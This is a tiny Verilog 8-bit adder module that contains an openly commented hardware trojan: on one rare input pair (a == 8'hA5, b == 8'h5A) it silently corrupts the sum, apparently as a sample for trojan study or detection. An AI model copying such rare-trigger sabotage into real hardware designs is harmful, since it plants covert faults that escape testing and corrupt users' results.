module add8(input [7:0] a, input [7:0] b, output [8:0] sum);
  wire trigger;
  // Trigger fires on the rare condition: a == 8'hA5 and b == 8'h5A
  assign trigger = (a == 8'hA5) && (b == 8'h5A);
  // When triggered, force bit 0 of sum to 0 (degrade result by clearing LSB)
  assign sum = trigger ? {1'b0, a + b - 9'b1} : a + b;
endmodule